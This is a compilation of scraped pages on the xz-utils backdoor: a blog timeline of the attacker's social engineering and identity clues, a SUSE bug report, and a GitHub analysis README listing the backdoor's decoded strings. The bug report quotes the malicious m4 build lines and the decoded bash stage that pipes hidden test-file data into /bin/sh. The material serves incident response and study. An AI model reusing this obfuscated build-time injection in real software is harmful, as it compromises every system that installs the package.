JiaT75 merges their first commit [on Jan 7, 2023](https://github.com/tukaani-project/xz/pull/7)[1](#fn1), which gives us a good indication of when they fully gain trust.

In March, the primary contact email in Google’s oss-fuzz is [updated](https://github.com/JiaT75/oss-fuzz/commit/6403e93344476972e908ce17e8244f5c2b957dfd) to be Jia’s, instead of *Lasse Collin*.

Testing infrastructure that will be used in this exploit is committed. Despite *Lasse Collin* being attributed as the author for this, *Jia Tan* committed it, and it was originally written by *Hans Jansen* in June:

* Commit: [liblzma: Add ifunc implementation to crc64\_fast.c](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=ee44863ae88e377a5df10db007ba9bfadde3d314)
* PR: [Replaced crc64\_fast constructor with ifunc by hansjans162](https://github.com/tukaani-project/xz/pull/53)

*Hans Jansen*’s account was seemingly made specifically to create this pull request. There is very little activity before and after. They will later push for the compromised version of XZ to be included in Debian.

In July, [a PR](https://github.com/google/oss-fuzz/pull/10667) was opened in oss-fuzz to disable ifunc for fuzzing builds, due to issues introduced by the changes above. This appears to be deliberate to mask the malicious changes that will be introduced soon. Also, JiaT75 opened an [issue](https://github.com/llvm/llvm-project/issues/63957) about a warning in clang that, while indeed incorrect, drew attention to ifuncs.

### 2024

A pull request for Google’s [oss-fuzz is opened](https://github.com/google/oss-fuzz/pull/11587) that changes the URL for the project from [tukaani.org/xz/](http://tukaani.org/xz/) to [xz.tukaani.org/xz-utils/](http://xz.tukaani.org/xz-utils/). [tukaani.org](http://tukaani.org) is hosted at `5.44.245.25` in Finland, at [this](https://www.zoner.fi/) hosting company. The `xz` subdomain, meanwhile, points to GitHub pages. This furthers the amount of control Jia has over the project.

A commit containing the final steps required to execute this backdoor is added to the repository:

* [Tests: Add a few test files](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0)
* [Tests: Update two test files](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6e636819e8f070330d835fce46289a3ff72a7b89)

#### The discovery

An email is sent to the oss-security mailing list: [backdoor in upstream xz/liblzma leading to ssh server compromise](https://www.openwall.com/lists/oss-security/2024/03/29/4), announcing this discovery, and doing it’s best to explain the exploit chain.

![](https://files.mastodon.social/accounts/avatars/109/362/110/832/715/599/original/6a9a410580be97af.jpg)**[AndresFreundTec](https://mastodon.social/%40AndresFreundTec/112180406142695845)** @AndresFreundTec@mastodon.social

I was doing some micro-benchmarking at the time, needed to quiesce the system to reduce noise. Saw sshd processes were using a surprising amount of CPU, despite immediately failing because of wrong usernames etc. Profiled sshd, showing lots of cpu time in liblzma, with perf unable to attribute it to a symbol. Got suspicious. Recalled that I had seen an odd valgrind complaint in automated testing of postgres, a few weeks earlier, after package updates.

Really required a lot of coincidences.

Mar 29, 2024, 18:32 791 retoots

A [gist](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27) has been published with a great high-level technical overview and a “what you need to know”

In addition to the gist and the email above, several analysis attempts have begun emerging:

* [xz/liblzma: Bash-stage Obfuscation Explained](https://gynvael.coldwind.pl/?lang=en&id=782#stage2-ext)
* [“It’s RCE, not auth bypass”](https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b)
* [[WIP] XZ Backdoor Analysis and symbol mapping](https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504)
* [Infographic](https://infosec.exchange/%40fr0gger/112189232773640259)
* [xzbot: notes, honeypot, and exploit demo for the xz backdoor](https://github.com/amlweems/xzbot)
* [research!rsc: The xz attack shell script](https://research.swtch.com/xz-script)

#### A sudden push for inclusion

A request for the vulnerable version to be included in Debian is opened by Hans:

* [#1067708 - xz-utils: New upstream version available](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708)

This request was opened the [same week](https://salsa.debian.org/hjansen) Hans’ Debian GitLab account was created. The account created a few similar “update” requests in various low-traffic repositories to build credibility, after asking for this one.

Several other, suspicious, anonymous name+number accounts with little former activity also push for its inclusion, including *misoeater91* and *krygorin4545*. *krygorin4545*’s PGP key was made 2 days before joining the discussion.

> Also seeing this bug. Extra valgrind output causes some failed tests for me. Looks like the new version will resolve it. Would like this new version so I can continue work.

> I noticed this last week and almost made a Valgrind bug. Glad to see it being fixed.
> Thanks Hans!

The Valgrind bugs mentioned were *introduced* by this malicious injection, as noted in the email to OSS-Security:

> Subsequently the injected code (more about that below) caused valgrind errors and crashes in some configurations, due to the stack layout differing from what the backdoor was expecting. These issues were attempted to be worked around in 5.6.1:

A [pull request](https://github.com/jamespfennell/xz/pull/2) to a go library by a 1Password employee is opened asking to upgrade the library to the vulnerable version, however, it was all unfortunate timing. 1Password reached out by email referring me to this [comment](https://github.com/jamespfennell/xz/pull/2#issuecomment-2027836356), and everything seems to check out.

A Fedora contributor [states](https://news.ycombinator.com/item?id=39866275) that *Jia* was pushing for its inclusion in Fedora as it contains “great new features”

*Jia Tan* also [attempted](https://bugs.launchpad.net/ubuntu/%2Bsource/xz-utils/%2Bbug/2059417) to get it into Ubuntu days before the beta freeze.

A few hours after all this came out, GitHub suspended JiaT75’s account. Thanks? They also banned the repository, meaning people can no longer audit the changes made to it without resorting to mirrors. Immensely helpful, GitHub. They also [suspended](https://github.com/JiaT75?tab=following) *Lasse Collin*’s account, which is completely disgraceful.

Lasse has begun reverting changes introduced by Jia, [including](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=f9cf4c05edd14dedfe63833f8ccbe41b55823b00) one that [added](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7) a sneaky period to disable the sandbox. They also have published a FAQ that begins to explain the situation: [XZ Utils backdoor](https://tukaani.org/xz-backdoor/)

### OSINT

Various people have reached out to me regarding discoveries about the identity of Jia. Some of this has been incorporated in the timeline, but other stuff is “timeless” so I’m putting it here:

#### IRC

I received an email that clarified a few points and provided new insight into the situation.

“Jia Tan” was present on the #tukaani IRC channel on Libera.Chat. A /whois revealed their connecting IP and activity on March 29th.

```
[libera] -!- jiatan [~jiatan@185.128.24.163]
[libera] -!-  was      : Jia Tan
[libera] -!-  hostname : 185.128.24.163
[libera] -!-  account  : jiatan
[libera] -!-  server   : tungsten.libera.chat [Fri Mar 29 14:47:40 2024]
[libera] -!- End of WHOWAS
```

Running a Nmap on the IP shows a lot of open ports, which probably indicates a proxy, hosting provider, or something of the sort. The IP is from Singapore.

Further research shows that this IP belongs to Witopia VPN, so it’s not entirely indicative of a region. Given the timezone, however, I feel like proximity becomes plausible.

#### Important notes on LinkedIn

I have received a few emails alerting me to a LinkedIn of somebody named *Jia Tan*[2](#fn2). Their bio boasts of *large-scale vulnerability management*. They claim to live in California. Is this our man? The commits on JiaT75’s GitHub are set to +0800, which would not indicate presence in California. UTC-0800 would be California. Most of the commits [were made](https://play.clickhouse.com/play?user=play#U0VMRUNUIHRvSG91cihjcmVhdGVkX2F0KSBBUyBob3VyLCBjb3VudCgqKSBGUk9NIGdpdGh1Yl9ldmVudHMgV0hFUkUgYWN0b3JfbG9naW49J0ppYVQ3NScgR1JPVVAgQlkgaG91ciBPUkRFUiBCWSBob3Vy) between UTC 12-17, which is awfully early for California. In my opinion, there is no sufficient evidence that the LinkedIn being discussed is our man. I think identity theft is more likely, but I am of course open to more evidence.

Apr 7 Update: Subsequently, I’ve received a lot of people sending me other LinkedIn accounts, theorizing about what his name could mean, etc., but I don’t think a bad actor would use their real name.

#### Discoveries in the Git logs

I received an email from [Minhu Wang](https://github.com/minhuw) who investigated the Git log, and found one instance where Jia’s username was different:

```
$ git shortlog --summary --numbered --email | grep jiat0218@gmail.com
273 Jia Tan <jiat0218@gmail.com>
2 jiat75 <jiat0218@gmail.com>
1 Jia Cheong Tan <jiat0218@gmail.com>
```

They found this particularly interesting as `Cheong` is new information

Furthermore, an [independent analysis](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and) of commit timings concludes that the perpetrator worked “Office Hours” in a UTC+02/03 timezone. It’s particularly notable that they worked through the Lunar New Year, and did not work on some notable Eastern European holidays, including Christmas and New Year. I have, however, been presented with a differing view, which you can read [here](https://lunduke.locals.com/post/5467061/xz-backdoor-i-did-a-more-thorough-analysis-and-i-changed-my-mind-again-specifically-i-compar).

[Ry Jones](https://github.com/ryjones) used gharchive to extract Jia’s entire git activity, and he uploaded it to a repository, viewable here: [jiat75-logs](https://github.com/ryjones/jiat75-logs). Jia’s GitHub username previously featured Cheong, but this has since been removed.

---

## 👟 Footnotes

1. Thanks @joeyh@hachyderm.io [↩︎](#fnref1)
2. I was also alerted to discussions of this on Gab, which should tell you what you need to know. [↩︎](#fnref2)

---

## 🌱 What links here?

* [Bountysource Stole at Least $21,000 From Open Source Developers](/node/bountysource)

[Evan Boehs](https://boehs.org) </node/everything-i-know-about-the-xz-backdoor>
```

        _____,....-----'------'-----''-------'---'----'--
```
**Main**

* [Home](/)
* [Contact](/contact)
* [Blog](/in/blog)
**Links**

* [GitHub](https://github.com/boehs)
* [Mastodon](https://social.coop/%40eb) ([Bsky](https://bsky.app/profile/did%3Aplc%3A7u5tor5fp3ai4jwvea6t6mjd))
* [Donate](https://liberapay.com/e) ([Ko-fi](https://ko-fi.com/evan))
**Meta**

* [⤺](https://xn--sr8hvo.ws/%F0%9F%86%8E%F0%9F%88%B6%E2%8F%B0/previous) 🕸💍 [⤻](https://xn--sr8hvo.ws/%F0%9F%86%8E%F0%9F%88%B6%E2%8F%B0/next)
* [Blogroll](/blogroll)
* [Analytics](https://beanbag.boehs.org/share/JGBYO4bVg3kZVQUb)


=== Content from bugzilla.suse.com_50a569f1_20250111_034013.html ===


| Bugzilla – Bug 1222124 | VUL-0: CVE-2024-3094: xz: backdoored 5.6.0,5.6.1 version | Last modified: 2024-08-29 20:35:21 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D1222124)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 1222124**](show_bug.cgi?id=1222124)
(CVE-2024-3094)
- VUL-0: CVE-2024-3094: xz: backdoored 5.6.0,5.6.1 version

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-0: CVE-2024-3094: xz: backdoored 5.6.0,5.6.1 version

| | [Status](page.cgi?id=status_resolution_matrix.html): | NEW | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2024-3094 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | SUSE Security Incidents | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Novell Products | | [Component:](describecomponents.cgi?product=SUSE Security Incidents "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Incidents ([show other bugs](buglist.cgi?component=Incidents&product=SUSE%20Security%20Incidents&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other Other | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P3 - Medium **Severity**: Normal | | [Target Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Security Team bot | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Security Team bot | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | <https://smash.suse.de/issue/399441/> | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1222448](show_bug.cgi?id=1222448 "IN_PROGRESS") | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | Show dependency [tree](showdependencytree.cgi?id=1222124&hide_resolved=1) / [graph](showdependencygraph.cgi?id=1222124) | |  | | Reported: | 2024-03-28 11:46 UTC by Marcus Meissner | | --- | --- | | Modified: | 2024-08-29 20:35 UTC ([History](show_activity.cgi?id=1222124)) | | CC List: | 11 users (show)  adrian.glaubitz cathy.hu danilo.spinella dimstar dmueller eyadlorenzo fkrueger hector.oron jie.gong meissner roger.whittaker | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=1222124) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=1222124&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=1222124&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1222124#c0)  Marcus Meissner   2024-03-28 11:46:09 UTC  ``` the 5.6.1 version of xz is backdoored  m4/build-to-host.m4 calls     gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`  and this:      gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null' ``` [Comment 1](show_bug.cgi?id=1222124#c1)  Marcus Meissner   2024-03-28 12:17:23 UTC  ``` grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ finds tests/files/bad-3-corrupt_lzma2.xz cat tests/files/bad-3-corrupt_lzma2.xz|tr "\t \-_" " \t_\-" >xx xz -c -d <xx >yy   yy is: ####Hello#### #345U211267$^D330^W [ ! $(uname) = "Linux" ] && exit 0 [ ! $(uname) = "Linux" ] && exit 0 [ ! $(uname) = "Linux" ] && exit 0 [ ! $(uname) = "Linux" ] && exit 0 [ ! $(uname) = "Linux" ] && exit 0 eval `grep ^srcdir= config.status` if test -f ../../config.status;then eval `grep ^srcdir= ../../config.status` srcdir="../../$srcdir" fi export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh ####World#### ``` [Comment 2](show_bug.cgi?id=1222124#c2)  Marcus Meissner   2024-03-28 12:44:20 UTC  ``` I informed distros list.  I reverted Base:System xz to 5.4.3 and submitted to Fatory. ``` [Comment 5](show_bug.cgi?id=1222124#c5)  Marcus Meissner   2024-03-28 19:02:53 UTC  ``` CRD: 2024-05-13   in vince.  i doubt it will hold. ``` [Comment 7](show_bug.cgi?id=1222124#c7)  Dirk Mueller   2024-03-28 22:08:18 UTC  ``` I can confirm that the described timing behavior difference is observable with the described method on openSUSE Tumbleweed from yesterday. I can confirm it's gone with todays snapshot. ``` [Comment 8](show_bug.cgi?id=1222124#c8)  Marcus Meissner   2024-04-02 11:14:03 UTC  ``` Status update:  We reverted xz in Base:System and openSUSE:Factory on March 28th.  Factory got a fixed ftp tree done by the buildops and factory devs.  A full factory bootstrap was triggered from a base built without a compromised xz.  news.opensuse.org post was published. <https://news.opensuse.org/2024/03/29/xz-backdoor/> ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=1222124)
* - [XML](show_bug.cgi?ctype=xml&id=1222124)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=1222124)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D1222124)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from github.com_b6e6f6d0_20250111_034017.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkarcherm%2Fxz-malware)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkarcherm%2Fxz-malware)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=karcherm%2Fxz-malware)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[karcherm](/karcherm)
/
**[xz-malware](/karcherm/xz-malware)**
Public

* [Notifications](/login?return_to=%2Fkarcherm%2Fxz-malware) You must be signed in to change notification settings
* [Fork
  6](/login?return_to=%2Fkarcherm%2Fxz-malware)
* [Star
   57](/login?return_to=%2Fkarcherm%2Fxz-malware)

Stuff discovered while analyzing the malware hidden in xz-utils 5.6.0 and 5.6.1

### License

[BSD-2-Clause license](/karcherm/xz-malware/blob/main/LICENSE)

[57
stars](/karcherm/xz-malware/stargazers) [6
forks](/karcherm/xz-malware/forks) [Branches](/karcherm/xz-malware/branches) [Tags](/karcherm/xz-malware/tags) [Activity](/karcherm/xz-malware/activity)
 [Star](/login?return_to=%2Fkarcherm%2Fxz-malware)

 [Notifications](/login?return_to=%2Fkarcherm%2Fxz-malware) You must be signed in to change notification settings

* [Code](/karcherm/xz-malware)
* [Issues
  0](/karcherm/xz-malware/issues)
* [Pull requests
  0](/karcherm/xz-malware/pulls)
* [Actions](/karcherm/xz-malware/actions)
* [Projects
  0](/karcherm/xz-malware/projects)
* [Security](/karcherm/xz-malware/security)
* [Insights](/karcherm/xz-malware/pulse)

Additional navigation options

* [Code](/karcherm/xz-malware)
* [Issues](/karcherm/xz-malware/issues)
* [Pull requests](/karcherm/xz-malware/pulls)
* [Actions](/karcherm/xz-malware/actions)
* [Projects](/karcherm/xz-malware/projects)
* [Security](/karcherm/xz-malware/security)
* [Insights](/karcherm/xz-malware/pulse)

# karcherm/xz-malware

    main[Branches](/karcherm/xz-malware/branches)[Tags](/karcherm/xz-malware/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[7 Commits](/karcherm/xz-malware/commits/main/) | | |
| [LICENSE](/karcherm/xz-malware/blob/main/LICENSE "LICENSE") | | [LICENSE](/karcherm/xz-malware/blob/main/LICENSE "LICENSE") |  |  |
| [README.md](/karcherm/xz-malware/blob/main/README.md "README.md") | | [README.md](/karcherm/xz-malware/blob/main/README.md "README.md") |  |  |
| [decode\_automaton.py](/karcherm/xz-malware/blob/main/decode_automaton.py "decode_automaton.py") | | [decode\_automaton.py](/karcherm/xz-malware/blob/main/decode_automaton.py "decode_automaton.py") |  |  |
| [liblzma\_la-crc64-fast.o.this-is-malware](/karcherm/xz-malware/blob/main/liblzma_la-crc64-fast.o.this-is-malware "liblzma_la-crc64-fast.o.this-is-malware") | | [liblzma\_la-crc64-fast.o.this-is-malware](/karcherm/xz-malware/blob/main/liblzma_la-crc64-fast.o.this-is-malware "liblzma_la-crc64-fast.o.this-is-malware") |  |  |
| [requirements.txt](/karcherm/xz-malware/blob/main/requirements.txt "requirements.txt") | | [requirements.txt](/karcherm/xz-malware/blob/main/requirements.txt "requirements.txt") |  |  |
| View all files | | |

## Repository files navigation

* README
* BSD-2-Clause license
# Information about the liblzma (xz-utils) backdoor

## Decoder for the string recognition automaton

The backdoor code, in the version extracted by Florian Weimer, contains no readable ASCII strings.
It also contains no obfuscated ASCII strings. Instead, it has a single state automaton to recognize
the required strings. Searching for a string is performed by inputting all candidate start addresses
into the string detection automaton, and checking whether the intended string is recognized. The
string detection automaton returns a string ID.

The string detection automaton is implemented in the function `_Lsimple_coder_update_0`, which has
this signature:

```
int detect_string(const void* startptr, const void* optional_endptr);

```

It returns 0 if no known string is detected at startptr (the search is aborted if endptr is encountered before
a match is detected), otherwise it returns a "string ID".

This is the table that is generated by running the script in this repository:

```
 810: ' from '
 678: ' ssh2'
  d8: '%.48s:%.48s():%d (pid=%ld)\x00'
 708: '%s'
 108: '/usr/sbin/sshd\x00'
 870: 'Accepted password for '
 1a0: 'Accepted publickey for '
 c40: 'BN_bin2bn\x00'
 6d0: 'BN_bn2bin\x00'
 958: 'BN_dup\x00'
 418: 'BN_free\x00'
 4e0: 'BN_num_bits\x00'
 790: 'Connection closed by '
  18: 'Could not chdir to home directory %s: %s\n\x00'
  b0: 'Could not get agent socket\x00'
 960: 'DISPLAY='
 9d0: 'DSA_get0_pqg\x00'
 468: 'DSA_get0_pub_key\x00'
 7e8: 'EC_KEY_get0_group\x00'
 268: 'EC_KEY_get0_public_key\x00'
 6e0: 'EC_POINT_point2oct\x00'
 b28: 'EVP_CIPHER_CTX_free\x00'
 838: 'EVP_CIPHER_CTX_new\x00'
 2a8: 'EVP_DecryptFinal_ex\x00'
 c08: 'EVP_DecryptInit_ex\x00'
 3f0: 'EVP_DecryptUpdate\x00'
  f8: 'EVP_Digest\x00'
 408: 'EVP_DigestVerify\x00'
 118: 'EVP_DigestVerifyInit\x00'
 d10: 'EVP_MD_CTX_free\x00'
 af8: 'EVP_MD_CTX_new\x00'
 6f8: 'EVP_PKEY_free\x00'
 758: 'EVP_PKEY_new_raw_public_key\x00'
 510: 'EVP_PKEY_set1_RSA\x00'
 c28: 'EVP_chacha20\x00'
 c60: 'EVP_sha256\x00'
 188: 'EVP_sm'
 8c0: 'GLIBC_2.2.5\x00'
 6a8: 'GLRO(dl_naudit) <= naudit\x00'
 1e0: 'KRB5CCNAME\x00'
 cf0: 'LD_AUDIT='
 bc0: 'LD_BIND_NOT='
 a90: 'LD_DEBUG='
 b98: 'LD_PROFILE='
 3e0: 'LD_USE_LOAD_BIAS='
 a88: 'LINES='
 ac0: 'RSA_free\x00'
 798: 'RSA_get0_key\x00'
 918: 'RSA_new\x00'
 1d0: 'RSA_public_decrypt\x00'
 540: 'RSA_set0_key\x00'
 8f8: 'RSA_sign\x00'
 990: 'SSH-2.0'
 4a8: 'TERM='
  e0: 'Unrecognized internal syslog level code %d\n\x00'
 158: 'WAYLAND_DISPLAY='
 878: '__errno_location\x00'
 2b0: '__libc_stack_end\x00'
 228: '__libc_start_main\x00'
 a60: '_dl_audit_preinit\x00'
 9c8: '_dl_audit_symbind_alt\x00'
 8a8: '_exit\x00'
 5b0: '_r_debug\x00'
 5b8: '_rtld_global\x00'
 a98: '_rtld_global_ro\x00'
  b8: 'auth_root_allowed\x00'
 1d8: 'authenticating'
  28: 'demote_sensitive_data\x00'
 348: 'getuid\x00'
 a48: 'ld-linux-x86-64.so'
 7d0: 'libc.so'
 7c0: 'libcrypto.so'
 590: 'liblzma.so'
 938: 'libsystemd.so'
  20: 'list_hostkey_types\x00'
 440: 'malloc_usable_size\x00'
  c0: 'mm_answer_authpassword\x00'
  c8: 'mm_answer_keyallowed\x00'
  d0: 'mm_answer_keyverify\x00'
 948: 'mm_answer_pam_start\x00'
  78: 'mm_choose_dh\x00'
  40: 'mm_do_pam_account\x00'
  50: 'mm_getpwnamallow\x00'
  a8: 'mm_log_handler\x00'
  38: 'mm_pty_allocate\x00'
  a0: 'mm_request_send\x00'
  48: 'mm_session_pty_cleanup2\x00'
  70: 'mm_sshpam_free_ctx\x00'
  58: 'mm_sshpam_init_ctx\x00'
  60: 'mm_sshpam_query\x00'
  68: 'mm_sshpam_respond\x00'
  30: 'mm_terminate\x00'
 c58: 'parse PAM\x00'
 400: 'password\x00'
 4f0: 'preauth'
 690: 'pselect\x00'
 7b8: 'publickey\x00'
 308: 'read\x00'
 710: 'rsa-sha2-256\x00'
 428: 'setlogmask\x00'
 5f0: 'setresgid\x00'
 ab8: 'setresuid\x00'
 760: 'shutdown\x00'
 d08: 'ssh-2.0'
 2c8: 'ssh-rsa-cert-v01@openssh.com\x00'
  88: 'sshpam_auth_passwd\x00'
  90: 'sshpam_query\x00'
  80: 'sshpam_respond\x00'
  98: 'start_pam\x00'
 9f8: 'system\x00'
 198: 'unknown\x00'
